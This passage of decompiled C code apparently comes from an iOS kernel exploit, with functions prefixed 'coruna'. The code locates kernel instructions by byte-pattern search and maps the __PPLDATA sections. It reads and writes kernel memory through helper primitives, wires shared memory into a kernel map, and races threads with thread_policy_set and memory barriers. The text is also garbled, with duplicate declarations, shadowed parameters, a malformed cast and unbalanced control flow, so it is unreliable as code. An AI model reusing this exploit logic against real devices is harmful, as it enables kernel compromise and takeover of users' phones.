  ptr[0x1c] = 0;
  ptr[0x17] = 0;
  ptr[0x16] = 0;
  ptr[0x19] = 0;
  ptr[0x18] = 0;
  ptr[0x13] = 0;
  ptr[0x12] = 0;
  ptr[0x15] = 0;
  ptr[0x14] = 0;
  ptr[0xf] = 0;
  ptr[0xe] = 0;
  ptr[0x11] = 0;
  ptr[0x10] = 0;
  ptr[0xb] = 0;
  ptr[10] = 0;
  ptr[0xd] = 0;
  ptr[0xc] = 0;
  ptr[7] = 0;
  ptr[6] = 0;
  ptr[9] = 0;
  ptr[8] = 0;
  ptr[3] = 0;
  ptr[2] = 0;
  ptr[5] = 0;
  ptr[4] = 0;
  ptr[1] = 0;
  *ptr = 0;
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(ptr);
  return;
}





unsigned long coruna_vm_deallocate(unsigned long arg)

{
  uint8_t *ptr;
  uint tag;
  unsigned long u;
  
  ptr = k_kernel_mach_task_self_slot;
  u = arg;
  if ((arg != 0) && (*(vm_address_t *)(arg + 0x10) != 0)) {
    _vm_protect(*(vm_map_t *)k_kernel_mach_task_self_slot,*(vm_address_t *)(arg + 0x10),0x4000,
                0,0x13);
    tag = _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x10),0x4000);
    u = (unsigned long)tag;
    *(uint64_t *)(arg + 0x10) = 0;
  }
  return u;
}





uint64_t coruna_mach_port_deallocate(long *handle)
{
  uint8_t *ptr;
  char err;
  kern_return_t lk3;
  task_t target_task;
  long handle;
  vm_size_t size;
  uint32_t u;
  long addr;
  unsigned long size;
  uint scratch;
  thread_act_array_t bootargs;
  mach_timespec_t thread_attr;
  uint16_t host_info;
  int serial_buf [2];
  char action;
  
  addr = *handle;
  action = '\0';
  serial_buf[0] = 0;
  serial_buf[1] = 0;
  host_info = 0x60;
  *(uint32_t *)(handle + 0x19) = 1;
  if (*(int *)(addr + 0x140) < 0x1809) {
    serial_buf[1] = 0x10;
    lk3 = _sigwait((sigset_t *)(serial_buf + 1),serial_buf);
  }
  else {
    lk3 = _clock_sleep_trap(0,1,10,0,&thread_attr);
  }
  *(uint32_t *)(handle + 0x19) = 2;
  coruna_kernel29bb0_residual_163(lk3);
  if (*(int *)(addr + 0x140) < 0x1809) {
    handle = handle[3] + 0xbc;
  }
  else {
    handle = handle[3] + 0xc4;
    if (0x18090a095fffff < *(unsigned long *)(addr + 0x158)) {
      handle = handle[3] + 0xbc;
    }
  }
  coruna_call_mach_vm_machine_attribute_29df8_1aa94(addr,handle,&host_info,2);
  coruna_thread_policy_set_d4e8(addr,0,handle[1],(int)handle[2],handle[0x14],&action);
  *(uint32_t *)(handle + 0x19) = 10;
  _thread_abort(*(thread_act_t *)(handle + 2));
  return 0;
}





unsigned long coruna_thread_policy_set_d4e8(long arg,int val,long n,thread_act_t m,uint64_t p,
                  uint8_t *q)

{
  long off;
  bool flags;
  int status;
  uint size;
  unsigned long kind;
  long base;
  long ctx_val;
  long serial;
  uint64_t action;
  long block_ctx;
  long scratch;
  integer_t stack_guard [2];
  long serial_buf;
  
  block_ctx = 0;
  scratch = 0;
  action = 0;
  kind = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98(arg,n,&scratch,&block_ctx,(long)&action + 4,&action);
  if ((block_ctx != 0 && scratch != 0) &&
     ((val == 0 ||
      ((kind = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98(arg,n,&scratch,&block_ctx,(long)&action + 4,&action),
       block_ctx != 0 && (scratch != 0)))))) {
    size = action;
    if (*(int *)(arg + 0x140) < 0x1809) {
      ctx_val = 0xa0;
      serial = 0x90;
      base = 0x450;
    }
    else {
      kind = *(unsigned long *)(arg + 0x158);
      status = coruna_ctx_test_flag(arg,0x4000);
      base = 0x460;
      if (status != 0) {
        base = 0x468;
      }
      off = 0x470;
      if (status != 0) {
        off = 0x478;
      }
      flags = 0x18090a095fffff < kind;
      serial = 0x98;
      if (flags) {
        serial = 0x90;
      }
      ctx_val = 0xa8;
      if (flags) {
        ctx_val = 0xa0;
        base = off;
      }
    }
    coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,base + n,0);
    kind = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,serial + n,0);
    if ((size >> 7 & 1) == 0) {
      if (((size ^ 0xffffffff) & 5) == 0) {
        kind = coruna_mach_vm_machine_attribute(arg,ctx_val + n,size & 0xfffffffb);
      }
      else if (size == 4) {
        serial_buf = 0;
        kind = coruna_kernel29bb0_trampoline_0001a670(arg,n + 0x18,&serial_buf);
        if (serial_buf == 0) {
          coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,n + 0x18,p);
          coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,n,n);
          coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,n + 8,n);
          stack_guard[0] = 0;
          size = _thread_policy_set(m,1,stack_guard,1);
          kind = (unsigned long)size;
        }
      }
    }
    *q = 1;
  }
  return kind;
}





void coruna_ctx_clear_d800(uint32_t *size,char *path)
{
  do {
    *size = 0x14;
    DataMemoryBarrier(3,3);
    *size = 0x15;
    DataMemoryBarrier(3,3);
    *size = 0x14;
    DataMemoryBarrier(3,3);
    *size = 0x15;
    DataMemoryBarrier(3,3);
    *size = 0x14;
    DataMemoryBarrier(3,3);
    *size = 0x15;
    DataMemoryBarrier(3,3);
    *size = 0x14;
    DataMemoryBarrier(3,3);
    *size = 0x15;
    DataMemoryBarrier(3,3);
  } while (*path == '\0');
  return;
}





void coruna_mach_absolute_time_d780(uint64_t *val,uint64_t id_2,unsigned long arg)
{
  uint64_t u;
  int err;
  
  err = 1000;
  do {
    do {
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      *val = id_2;
      DataSynchronizationBarrier(3,3,0);
      err = err + -1;
    } while (err != 0);
    u = _mach_absolute_time();
    err = 1000;
  } while (u < arg);
  return;
}





int coruna_pthread_attr_setdetachstate(uint64_t val,uint64_t id_2,uint32_t size)
{
  int err;
  void **lppv2;
  int status;
  int flags;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  int thread_attr;
  pthread_t host_info;
  pthread_attr_t serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  flags = 10;
  do {
    serial_buf.__opaque[0x20] = '\0';
    serial_buf.__opaque[0x21] = '\0';
    serial_buf.__opaque[0x22] = '\0';
    serial_buf.__opaque[0x23] = '\0';
    serial_buf.__opaque[0x24] = '\0';
    serial_buf.__opaque[0x25] = '\0';
    serial_buf.__opaque[0x26] = '\0';
    serial_buf.__opaque[0x27] = '\0';
    serial_buf.__opaque[0x18] = '\0';
    serial_buf.__opaque[0x19] = '\0';
    serial_buf.__opaque[0x1a] = '\0';
    serial_buf.__opaque[0x1b] = '\0';
    serial_buf.__opaque[0x1c] = '\0';
    serial_buf.__opaque[0x1d] = '\0';
    serial_buf.__opaque[0x1e] = '\0';
    serial_buf.__opaque[0x1f] = '\0';
    serial_buf.__opaque[0x30] = '\0';
    serial_buf.__opaque[0x31] = '\0';
    serial_buf.__opaque[0x32] = '\0';
    serial_buf.__opaque[0x33] = '\0';
    serial_buf.__opaque[0x34] = '\0';
    serial_buf.__opaque[0x35] = '\0';
    serial_buf.__opaque[0x36] = '\0';
    serial_buf.__opaque[0x37] = '\0';
    serial_buf.__opaque[0x28] = '\0';
    serial_buf.__opaque[0x29] = '\0';
    serial_buf.__opaque[0x2a] = '\0';
    serial_buf.__opaque[0x2b] = '\0';
    serial_buf.__opaque[0x2c] = '\0';
    serial_buf.__opaque[0x2d] = '\0';
    serial_buf.__opaque[0x2e] = '\0';
    serial_buf.__opaque[0x2f] = '\0';
    serial_buf.__opaque[0] = '\0';
    serial_buf.__opaque[1] = '\0';
    serial_buf.__opaque[2] = '\0';
    serial_buf.__opaque[3] = '\0';
    serial_buf.__opaque[4] = '\0';
    serial_buf.__opaque[5] = '\0';
    serial_buf.__opaque[6] = '\0';
    serial_buf.__opaque[7] = '\0';
    serial_buf.__sig = 0;
    serial_buf.__opaque[0x10] = '\0';
    serial_buf.__opaque[0x11] = '\0';
    serial_buf.__opaque[0x12] = '\0';
    serial_buf.__opaque[0x13] = '\0';
    serial_buf.__opaque[0x14] = '\0';
    serial_buf.__opaque[0x15] = '\0';
    serial_buf.__opaque[0x16] = '\0';
    serial_buf.__opaque[0x17] = '\0';
    serial_buf.__opaque[8] = '\0';
    serial_buf.__opaque[9] = '\0';
    serial_buf.__opaque[10] = '\0';
    serial_buf.__opaque[0xb] = '\0';
    serial_buf.__opaque[0xc] = '\0';
    serial_buf.__opaque[0xd] = '\0';
    serial_buf.__opaque[0xe] = '\0';
    serial_buf.__opaque[0xf] = '\0';
    bootargs = 0;
    thread_attr = 0;
    host_info = (pthread_t)0x0;
    scratch = 0;
    scratch = 0;
    err = _pthread_attr_init(&serial_buf);
    if (err == 0) {
      err = _pthread_attr_setdetachstate(&serial_buf,1);
      if (err == 0) {
        scratch = val;
        scratch = id_2;
        bootargs = size;
        lppv2 = (void **)coruna_fn_ptr_cast(coruna_macho_data_sect);
        err = _pthread_create(&host_info,&serial_buf,lppv2,&scratch);
        if ((err == 0) &&
           (err = _pthread_join(host_info,(void **)0x0), status = thread_attr, err == 0)) {
          err = _pthread_attr_destroy(&serial_buf);
          if (status == 0) goto fail;
          if (*(long *)k_kernel_stack_chk_guard_slot != action) {
          ___stack_chk_fail(err);
          }
          return status;
        }
      }
      err = _pthread_attr_destroy(&serial_buf);
    }
fail:
    flags = flags + -1;
    if (flags == 0) {
      status = 0;
done:
      if (*(long *)k_kernel_stack_chk_guard_slot != action) {
        ___stack_chk_fail(err);
      }
      return status;
    }
  } while( true );
}





void coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98(long handle,long addr_2,uint64_t *val,uint64_t *id_2,
                 uint32_t *size,uint32_t *flags_2)
{
  int err;
  long handle;
  unsigned long u;
  long addr;
  long off;
  long base;
  uint64_t scratch[22];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  if ((addr_2 != 0) && (err = coruna_call_mach_vm_machine_attribute_29df8_18d98((int)handle,addr_2,0xb0,scratch), err != 0)) {
    if (*(int *)(handle + 0x140) < 0x1809) {
      base = 0x74;
      off = 0xa0;
      addr = 0x90;
      handle = 0x80;
    }
    else {
      u = *(unsigned long *)(handle + 0x158);
      handle = 0x80;
      if (u < 0x18090a09600000) {
        handle = 0x88;
      }
      addr = 0x90;
      if (u < 0x18090a09600000) {
        addr = 0x98;
      }
      off = 0xa0;
      if (u < 0x18090a09600000) {
        off = 0xa8;
      }
      base = 0x74;
      if (u < 0x18090a09600000) {
        base = 0x7c;
      }
    }
    *id_2 = *(uint64_t *)((long)scratch + handle);
    *val = *(uint64_t *)((long)scratch + addr);
    *size = *(uint32_t *)((long)scratch + off);
    *flags_2 = *(uint32_t *)((long)scratch + base);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail();
  }
  return;
}






static void coruna_kernel29bb0_macho_data_sect_finish(long off,long *ptr,uint32_t cache_22,
    vm_address_t lv6,vm_address_t cache_21,long cache_35)
{
  uint kind = 0;
  coruna_mach_port_destroy_f238(off,*(uint32_t *)(off + 0x180),cache_22,lv6,cache_21);
  *(uint *)((long)ptr + 0x14) = kind;
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
    ___stack_chk_fail();
  }
}

void coruna_macho_data_sect(void)
{
  long handle;
  long addr;
  long off;
  long base;
  uint u;
  vm_map_t target_task;
  vm_address_t lv6;
  int err;
  kern_return_t lk8;
  long *ptr;
  long ctx_val;
  void *buf;
  uint64_t size;
  vm_address_t *str;
  uint32_t version;
  unsigned long port;
  unsigned long tag;
  long serial;
  long serial_7;
  memory_object_offset_t lm19;
  long serial_8;
  long serial_9;
  long serial_10;
  uint kind;
  mach_vm_address_t lm24;
  unsigned long size;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  vm_inherit_t in_stack_ffffffffffffe770;
  uint scratch;
  uint32_t scratch;
  uint8_t bootargs[8];
  long thread_attr;
  uint64_t bootargs;
  long host_info;
  uint64_t thread_attr;
  long serial_buf;
  uint8_t *action;
  long block_ctx;
  uint32_t stack_guard;
  vm_address_t sa_saved [20];
  mach_vm_address_t sa_new;
  unsigned long path_buf;
  long tmp_buf;
  long region;
  unsigned long plist;
  uint64_t url_buf;
  long json_buf;
  int sect_from_store;
  long frame;
  long work;
  long cache;
  long cache_20;
  mach_port_t cache_21;
  vm_address_t cache_22;
  long cache_23;
  vm_address_t cache_24;
  long cache_25;
  uint64_t cache_26;
  long cache_27;
  long cache_28;
  memory_object_size_t cache_29 [3];
  uint32_t cache_30;
  uint cache_31;
  uint8_t cache_32[4096];
  memory_object_offset_t cache_33;
  long cache_34;
  long cache_35;
  
  ptr = (long *)(*(void (*)k_kernel_chkstk_darwin_slot)();
  cache_35 = *(long *)k_kernel_stack_chk_guard_slot;
  off = *ptr;
  base = ptr[1];
  u = *(uint *)(ptr + 2);
  cache_23 = 0;
  cache_22 = 0;
  cache_21 = 0;
  ctx_val = coruna_mach_timebase_info_e558(off);
  _bzero(sa_saved,0x240);
  _bzero(bootargs,0x308);
  _bzero(cache_32,0x1000);
  if (ctx_val != 0) {
    tag = (unsigned long)*(uint *)(ctx_val + 0xb8);
    if (((*(uint *)(ctx_val + 0xb8) == 0) || (cache_20 = *(long *)(ctx_val + 0xc0), cache_20 == 0)
        ) || (kind = *(uint *)(ctx_val + 200), kind == 0)) {
      cache_20 = -0x7fdffffffffdfff2;
      tag = 0x708;
      *(uint32_t *)(ctx_val + 0xb8) = 0x708;
      *(uint64_t *)(ctx_val + 0xc0) = 0x802000000002000e;
      kind = 0x6c0;
      *(uint32_t *)(ctx_val + 200) = 0x6c0;
    }
    serial = *(long *)(ctx_val + 0x88);
    if (serial == 0) {
      lm19 = *(memory_object_offset_t *)(&k_kernel_slot_19f8 + off);
      coruna_macho_text_sect(&cache_24,lm19);
      serial_9 = coruna_strsep(&cache_24,"4F 07 80 D2",0,1);
      if (serial_9 != 0) {
        coruna_macho_text_sect(cache_29,lm19);
        serial = coruna_return_zero_f2cc(cache_29,serial_9);
        if (serial != 0) {
          if (*(int *)(lm19 + 0x70) < 0x1809) {
            serial = serial + -0x14;
            err = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(lm19,serial);
            if (err == -0x55e8fc20) {
              serial_9 = 0;
              if (serial != 0) {
                err = *(int *)(off + 0x140);
                version = 0x50;
                if (err < 0x1809) {
                  version = 0x30;
                }
                *(uint32_t *)(ctx_val + 0x90) = version;
                *(long *)(ctx_val + 0x88) = serial;
                *(long *)(ctx_val + 0xf0) = serial_9;
                sect_from_store = 1;
              }
            }
          }
          else {
            cache_25 = serial + 4;
            cache_26 = 0x100;
            cache_24 = lm19;
            serial = coruna_return_zero_f2cc(&cache_24,serial_9);
            if (serial != 0) {
              serial = serial + -0x14;
              err = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(lm19,serial);
              if ((err == -0x55e8fc20) &&
                 (coruna_macho_map_segsect(&cache_33,lm19,"__PPLDATA","__data"), serial_9 = cache_34,
                 cache_34 != 0) && serial != 0) {
                err = *(int *)(off + 0x140);
                version = 0x50;
                if (err < 0x1809) {
                  version = 0x30;
                }
                *(uint32_t *)(ctx_val + 0x90) = version;
                *(long *)(ctx_val + 0x88) = serial;
                *(long *)(ctx_val + 0xf0) = serial_9;
                goto done;
              }
            }
          }
        }
      }
    }
    if (serial != 0 || sect_from_store) {
      if (!sect_from_store) {
        version = *(uint32_t *)(ctx_val + 0x90);
        serial_9 = *(long *)(ctx_val + 0xf0);
        err = *(int *)(off + 0x140);
      }
      if (err < 0x1809) {
        serial_10 = *(long *)(ctx_val + 0x98);
        if (serial_10 == 0) {
          coruna_macho_text_sect(&cache_24,*(uint64_t *)(&k_kernel_slot_19f8 + off));
          serial_10 = coruna_strsep(&cache_24,"EF 07 80 D2",0,1);
          kind = 0;
          serial_7 = 0;
          *(long *)(ctx_val + 0x98) = serial_10;
        }
        else {
          serial_7 = 0;
        }
      }
      else {
        serial_7 = *(long *)(ctx_val + 0xa0);
        if (serial_7 == 0) {
          cache_29[0] = 0;
          err = coruna_kernel29bb0_residual_165(off,"com.apple.driver.AppleT8020DART",cache_29);
          if ((err != 0) && (buf = _calloc(0x128,1), buf != (void *)0x0)) {
            coruna_ctx_clear_1090c(buf,off);
            type_id = *(uint64_t *)(off + 0x148);
            size = *(uint64_t *)(off + 0x140);
            type_id_9 = *(uint64_t *)(off + 0x158);
            type_id_8 = *(uint64_t *)(off + 0x150);
            *(uint64_t *)((long)buf + 0x90) = *(uint64_t *)(off + 0x160);
            *(uint64_t *)((long)buf + 0x78) = type_id;
            *(uint64_t *)((long)buf + 0x70) = size;
            *(uint64_t *)((long)buf + 0x88) = type_id_9;
            *(uint64_t *)((long)buf + 0x80) = type_id_8;
            *(uint32_t *)((long)buf + 0x98) = *(uint32_t *)(off + 0x178);
            *(uint32_t *)((long)buf + 0x38) = *(uint32_t *)(off + 0x180);
            err = coruna_call_find_text_exec(buf,*(uint32_t *)(&k_kernel_slot_1918 + off),cache_29[0],0);
            if (err != 0) {
              if (*(long *)(&k_kernel_slot_19f8 + off) != 0) {
                *(uint32_t *)((long)buf + 0x30) =
                     *(uint32_t *)(*(long *)(&k_kernel_slot_19f8 + off) + 0x30);
              }
              *(void **)(&k_kernel_slot_1d28 + off) = buf;
              coruna_macho_text_sect(&cache_24,buf);
              serial_7 = coruna_strsep(&cache_24,"F4 5F 01 29 60 22 41 F9",0,1);
              if (serial_7 != 0) {
                serial_10 = 0;
                *(long *)(ctx_val + 0xa0) = serial_7;
              }
            }
          }
          kind = 0;
        }
        serial_10 = 0;
      }
      port = *(unsigned long *)(ctx_val + 0xa8);
      if (port == 0) {
        coruna_macho_map_segsect(&cache_24,*(uint64_t *)(&k_kernel_slot_19f8 + off),"__PPLDATA_CONST","__const")
        ;
        port = 0;
        if (cache_25 != 0) {
          port = cache_25 + 0x40;
        }
        kind = 0;
        *(unsigned long *)(ctx_val + 0xa8) = port;
      }
      serial_8 = *(long *)(ctx_val + 0xb0);
      if (serial_8 == 0) {
        cache_24 = coruna_u64_pack((cache_24), (int)tag);
        serial_8 = coruna_vm_deallocate_2c8ec(off,&cache_24);
        if ((serial_8 != 0) && ((int)cache_24 == (int)tag)) {
          *(long *)(ctx_val + 0xb0) = serial_8;
        }
        else {
          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,serial_8,cache_32,tag);
        }
        if (err != 0) {
          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,serial_8,&cache_20,8);
          if ((err != 0) && (err = coruna_mach_vm_machine_attribute(off,serial_8 + (unsigned long)kind,0xe), err != 0))
          {
            lm24 = *(mach_vm_address_t *)(ctx_val + 0xd0);
            if (lm24 == 0) {
              cache_24 = coruna_u64_pack((cache_24), (8));
              lm24 = coruna_vm_deallocate_2c8ec(off,&cache_24);
              if ((lm24 != 0) && ((int)cache_24 == 8)) {
                *(mach_vm_address_t *)(ctx_val + 0xd0) = lm24;
              }
              else {
                err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,lm24,cache_32,8);
              }
              if (err != 0) {
                addr = *(long *)(ctx_val + 0xd8);
                if (*(long *)(ctx_val + 0xd8) != 0) {
code_r0x0000de84:
                  cache_23 = addr;
                  size = (unsigned long)*(uint *)(off + 0x180);
                  target_task = *(vm_map_t *)k_kernel_mach_task_self_slot;
                  cache_24 = 0;
                  cache_29[0] = 0;
                  cache_21 = 0;
                  cache_22 = 0;
                  lk8 = _vm_allocate(target_task,&cache_24,size,1);
                  if ((((lk8 != 0) ||
                       (cache_29[0] = size,
                       lk8 = _mach_make_memory_entry_64
                                         (target_task,cache_29,cache_24,3,&cache_21,0),
                       lk8 != 0)) ||
                      (lk8 = _vm_map(*(vm_map_t *)(&k_kernel_slot_1918 + off),&cache_22,size,0,1,
                                       cache_21,0,0,3,2,in_stack_ffffffffffffe770), lk8 != 0))
                     || ((lk8 = _mach_vm_wire(*(host_priv_t *)(&k_kernel_slot_1920 + off),target_task,
                                                cache_24,size,3), lk8 != 0 ||
                         (lk8 = _mach_vm_wire(*(host_priv_t *)(&k_kernel_slot_1920 + off),
                                                *(vm_map_t *)(&k_kernel_slot_1918 + off),cache_22,size
                                                ,3), lv6 = cache_24, lk8 != 0)))) {
                    coruna_mach_port_destroy_f238(off,size,cache_22,cache_24,cache_21);
                    kind = 0;
                    cache_22 = 0;
                    cache_21 = 0;
                    *(uint *)((long)ptr + 0x14) = kind;
                    if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
                    ___stack_chk_fail();
                    }
                    return;
                  }
                  kind = 0;
                  if (*(char *)(ctx_val + 0xf8) == '\0') {
                    err = *(int *)(off + 0x140);
                    addr = 0xe34;
                    if (err < 0x1809) {
                      addr = 0x5bc;
                    }
                    addr = addr + cache_23;
                    _bzero(sa_saved,0x240);
                    region = 1;
                    sa_new = cache_22;
                    if (0x1808 < err) {
                      json_buf = serial_9;
                      frame = serial_9;
                      work = serial_9;
                      cache = serial_9;
                    }
                    cache_33 = lv6;
                    path_buf = tag;
                    tmp_buf = serial_8;
                    plist = port;
                    cache_34 = addr + -8;
                    err = coruna_macho_data_seg(off,serial,version,sa_saved,coruna_mach_absolute_time_f1f8,&cache_33);
                    if (err == 0) {
                      coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                    }
                    err = coruna_kernel29bb0_trampoline_0001a670(off,addr,&scratch);
                    kind = 0;
                    if ((err != 0) && (coruna_u64_pack((scratch), (scratch)) == 1)) {
                      *(uint8_t *)(ctx_val + 0xf8) = 1;
                      err = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_3(off,2,1);
                      if (err != 0) goto nomem;
                      coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                    }
                  }
                  else {
nomem:
                    addr = cache_23;
                    if (*(long *)(ctx_val + 0x100) == base) {
invalid:
                      cache_30 = 0;
                      cache_31 = u;
                      if (*(int *)(off + 0x140) < 0x1809) {
                        serial = *(long *)(ctx_val + 0xe0);
                        if (serial == 0) {
                          cache_24 = coruna_u64_pack((cache_24), (8));
                          serial = coruna_vm_deallocate_2c8ec(off,&cache_24);
                          if ((serial == 0) || ((int)cache_24 != 8)) {
                            coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                          }
                          *(long *)(ctx_val + 0xe0) = serial;
                        }
                        err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,serial,&cache_30,8);
                        if (err != 0) {
                          thread_attr = cache_23;
                          bootargs = 0x8030;
                          thread_attr = 8;
                          host_info = serial;
                          block_ctx = serial_10;
                          ctx_val = coruna_mach_timebase_info_e558(off);
                          if (ctx_val != 0) {
                            serial = *(long *)(ctx_val + 0x60);
                            if (serial == 0) {
                              coruna_macho_text_sect(cache_29,*(uint64_t *)(&k_kernel_slot_19f8 + off));
                              serial = coruna_strsep(cache_29,"80 D0 38 D5 15 .. .. 91 B5 02 40 F9"
                                                    ,0,1);
                              if (serial == 0) {
                                coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                              }
                              *(long *)(ctx_val + 0x60) = serial;
                            }
                            serial_9 = *(long *)(ctx_val + 0x68);
                            if (serial_9 == 0) {
                              coruna_macho_text_sect(cache_29,*(uint64_t *)(&k_kernel_slot_19f8 + off));
                              serial_9 = coruna_strsep(cache_29,
                                                                                                        
                                                  "61 86 40 f9 62 12 41 b9 63 7e 40 f9 e0 03 13 aa .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. 00 00 80 52 fd 7b 41 a9 f4 4f c2 a8 ff 0f 5f d6"
                                                  ,0,1);
                              if (serial_9 == 0) {
                                coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                              }
                              *(long *)(ctx_val + 0x68) = serial_9;
                            }
                            serial_7 = *(long *)(ctx_val + 0x70);
                            if (serial_7 == 0) {
                              coruna_macho_text_sect(cache_29,*(uint64_t *)(&k_kernel_slot_19f8 + off));
                              serial_7 = coruna_strsep(cache_29,
                                                                                                        
                                                  "DF 4F 03 D5 83 D0 38 D5 BF 02 00 91 60 .. 42 F9 E0 4F 00 F9"
                                                  ,0,1);
                              if (serial_7 == 0) {
                                coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                              }
                              *(long *)(ctx_val + 0x70) = serial_7;
                            }
                            serial_10 = *(long *)(ctx_val + 0x80);
                            if (serial_10 == 0) {
                              cache_29[0] = coruna_u64_pack((cache_29[0]), (0x308));
                              serial_10 = coruna_mach_port_allocate_2248c(off,cache_29);
                              if ((serial_10 == 0) || ((int)cache_29[0] != 0x308)) {
                                coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                              }
                              *(long *)(ctx_val + 0x80) = serial_10;
                            }
                            serial_8 = *(long *)(ctx_val + 0x78);
                            if (serial_8 == 0) {
                              cache_29[0] = coruna_u64_pack((cache_29[0]), (0x4000));
                              serial_8 = coruna_mach_port_allocate_2248c(off,cache_29);
                              if ((serial_8 == 0) || ((int)cache_29[0] != 0x4000)) {
                                coruna_kernel29bb0_macho_data_sect_finish(off,ptr,cache_22,lv6,cache_21,cache_35);
                      return;
                              }
                              *(long *)(ctx_val + 0x78) = serial_8;
                            }
                            stack_guard = 0x80400304;
                            action = &UNK_00003c90 + serial_8;
                            serial_buf = serial;
                            err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,serial_10,bootargs,0x308);
                            if (err != 0) {
                              _bzero(&cache_24,0x240);
                              cache_27 = serial_10;
                              cache_28 = serial_10;
                              err = coruna_macho_data_seg(off,serial_9,0x10,&cache_24,0,0);
                              if (err != 0) {
                                _bzero(&cache_24,0x240);
                                str = &cache_24;
                                size = 0;
                                cache_28 = serial_10;
                                goto again;
                              }
                            }
                          }
                        }
                      }
                      else {
                        lm24 = *(mach_vm_address_t *)(ctx_val + 0xe8);
                        if (lm24 == 0) {
                          cache_24 = coruna_u64_pack((cache_24), (0x1000));
                          lm24 = coruna_vm_deallocate_2c8ec(off,&cache_24);
                          if ((lm24 != 0) && ((int)cache_24 == 0x1000)) {
                            *(mach_vm_address_t *)(ctx_val + 0xe8) = lm24;
                            goto exit_ok;
                          }
                        }
                        else {
                          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,lm24,cache_32,0x1000);
                          if (err != 0) {
exit_ok:
                            _bzero(sa_saved,0x240);
                            url_buf = 0xffffffff;
                            sa_new = lm24;
                            plist = (unsigned long)u;
                            err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,lm24 + 0x240,cache_23);
                            if (err != 0) {
                              str = sa_saved;
                              size = 0x40;
again:
                              err = coruna_macho_data_seg(off,serial_7,size,str,0,0);
                              if (err != 0) {
                                err = coruna_kernel29bb0_via_ioconnectcallmethod(off,base,&scratch);
                                kind = (uint)(err != 0 && u == scratch);
                                coruna_mach_port_destroy_f238(off,*(uint32_t *)(off + 0x180),cache_22,lv6,cache_21);
                                *(uint *)((long)ptr + 0x14) = kind;
                                if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
                                ___stack_chk_fail();
                                }
                                return;
                              }
                            }
                          }
                        }
                      }
                    }
                    else {
                      handle = cache_23 + 0xde8;
                      _bzero(sa_saved,0x240);
                      sa_new = cache_22;
                      if (0x1808 < *(int *)(off + 0x140)) {
                        json_buf = serial_9;
                        frame = serial_9;
                        work = serial_9;
                        cache = serial_9;
                      }
                      cache_33 = lv6;
                      path_buf = tag;
                      tmp_buf = serial_8;
                      region = base + -0x5c;
                      plist = port;
                      cache_34 = handle;
                      err = coruna_macho_data_seg(off,serial,version,sa_saved,coruna_mach_absolute_time_f1f8,&cache_33);
                      if (err != 0) {
                        err = coruna_kernel29bb0_trampoline_0001a670(off,addr + 0xdf0,&scratch);
                        kind = 0;
                        if ((err == 0) || (coruna_u64_pack((scratch), (scratch)) != base + -0x5c))
                        coruna_mach_port_destroy_f238(off,*(uint32_t *)(off + 0x180),cache_22,lv6,cache_21);
                        *(uint *)((long)ptr + 0x14) = kind;
                        if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
                        ___stack_chk_fail();
                        }
                        return;
                      }
                    }
                    kind = 0;
                  }
parse_ok:
                  coruna_mach_port_destroy_f238(off,*(uint32_t *)(off + 0x180),cache_22,lv6,cache_21);
                  *(uint *)((long)ptr + 0x14) = kind;
                  if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
                  ___stack_chk_fail();
                  }
                  return;
                }
                _bzero(sa_saved,0x240);
                if (0x1808 < *(int *)(off + 0x140)) {
                  json_buf = serial_9;
                  frame = serial_9;
                  work = serial_9;
                  cache = serial_9;
                }
                sa_new = lm24;
                path_buf = tag;
                tmp_buf = serial_8;
                plist = port;
                err = coruna_macho_data_seg(off,serial,version,sa_saved,0,0);
                if (err != 0) {
